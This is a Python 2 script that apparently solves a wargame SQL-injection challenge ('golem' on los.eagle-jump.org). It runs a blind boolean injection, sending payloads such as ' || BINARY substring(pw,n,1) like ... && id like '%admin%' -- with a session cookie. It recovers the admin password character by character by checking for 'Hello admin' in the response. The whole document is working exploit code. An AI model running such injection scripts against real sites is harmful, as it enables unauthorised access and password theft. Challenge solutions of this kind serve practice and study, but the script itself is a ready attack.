import httplib
import urllib
import sys

result = ""
conn = httplib.HTTPConnection("los.eagle-jump.org")
headers = {'Cookie':'PHPSESSID=99ba2dae628al10o6meqmvejh6','Content-Type':'application/x-www-form-urlencoded'}

for y in range(1,20):
	print y,
	print ':',
	for x in range(48,127):
		urladdr = urllib.quote("' || BINARY substring(pw,"+str(y)+",1) like '%"+chr(x)+"%' && id like '%admin%' -- ")
		
		conn.request("GET","/golem_39f3348098ccda1e71a4650f40caa037.php?pw="+urladdr,'',headers)
		response = conn.getresponse()
		data = str(response.read())

		if (data.find("Hello admin") != -1):
			result = result + chr(x)
			print result
			break

		if(x == 126):
			print "Query end"
			sys.exit(1)

print result
conn.close()